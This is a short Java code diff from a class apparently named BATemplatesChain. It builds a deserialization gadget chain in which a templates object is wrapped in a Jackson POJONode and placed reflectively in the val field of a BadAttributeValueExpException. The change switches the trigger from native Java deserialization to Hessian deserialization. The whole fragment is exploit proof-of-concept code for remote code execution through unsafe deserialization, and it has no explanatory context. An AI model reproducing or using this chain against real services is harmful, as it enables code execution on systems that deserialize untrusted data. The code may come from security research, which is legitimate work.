@@ -13,7 +13,8 @@ public class BATemplatesChain {
         POJONode jsonNodes = new POJONode(templates);
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("anything");
         SerializeUtils.setFieldValue(badAttributeValueExpException,"val",jsonNodes);
-        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
+        //SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
+        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(badAttributeValueExpException));
 
     }
 }
